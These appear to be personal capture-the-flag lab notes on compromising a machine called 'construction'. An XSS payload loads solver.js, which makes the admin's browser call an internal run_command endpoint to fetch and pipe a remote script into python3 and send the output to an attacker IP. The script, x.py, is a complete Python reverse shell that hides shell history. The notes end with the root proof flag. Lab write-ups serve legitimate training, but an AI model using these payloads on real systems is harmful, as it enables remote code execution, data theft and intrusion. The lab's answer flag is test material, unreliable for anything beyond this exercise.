at the very bottom of the page their is a way to get command execution, however  if we try to run a command such as `ps` we arent allowed to
![[Pasted image 20250224143818.png]]
Forbidden, but we find the new endpoint `http://construction:3000/run_command`
![[Pasted image 20250224143833.png]]
so we need to abuse this from the internal interface by utilizing `XSS`

`solver.js` provided from walkthrough
-  hits the `localhost:3000/run_command` endpoint from the `admin` perspective and attempts to pull over `x.py` and executes the `x.py` with `python3`
- reads the command output as a `string`, `base64` encodes the `text` and send to the `kali` machine as `b` by appending it to `http://192.168.45.166/a?`
```js
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl 192.168.45.166:81/x.py | python3"

}).then(function(response) {
    response.text().then(function(text) {
    window.location.href="http://192.168.45.166/a?b=" + btoa(text);
    });
});
```
`x.py` provided from walkthrough
- basic `python` reverse shell
```python
import os
import pty
import socket

lhost = "192.168.45.166"
lport = 445

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()
```
payload to kick it off  
```bash
<script src="http://192.168.45.166:81/solver.js"></script>
```
kicking off the payload in the `vulnerable` fields
![[Pasted image 20250224200808.png]]

![[Pasted image 20250224195900.png]]

![[Pasted image 20250224195940.png]]
`proof.txt`
```bash

eb448cec8aa05c2a93d6e29e2afdb534
root@construction:/root# ```